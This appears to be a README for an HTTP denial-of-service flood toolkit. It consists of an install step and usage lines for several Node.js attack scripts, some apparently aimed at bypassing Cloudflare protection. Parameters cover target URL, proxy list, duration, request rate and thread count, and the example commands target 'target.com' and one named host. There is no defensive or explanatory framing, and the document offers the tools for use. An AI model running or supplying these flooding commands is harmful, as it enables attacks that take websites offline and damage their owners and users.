---------------------------------------------------------------------------
#HTTP-DOS
---------------------------------------------------------------------------
sh install.sh
---------------------------------------------------------------------------
npm i randomstring
---------------------------------------------------------------------------
node jsfile [METHOD] [TARGET] [PROXIES] [DURATION] [RPC] [THREADS]
---------------------------------------------------------------------------
node http1.js GET "https://target.com" http.txt 120 64 1
---------------------------------------------------------------------------
node http2.js GET "https://target.com" http.txt 120 64 1
---------------------------------------------------------------------------
node https-cff.js GET https://target.com/ proxy.txt 1200 64 4
---------------------------------------------------------------------------
node https-cfstr.js https://target.com/ 1200 4 GET proxy.txt 64
---------------------------------------------------------------------------
node https-socket.js https://tls.mrrage.xyz/ http.txt 1200 64 4
---------------------------------------------------------------------------
node power.js https://target.com// http.txt 1200 GET 4
---------------------------------------------------------------------------
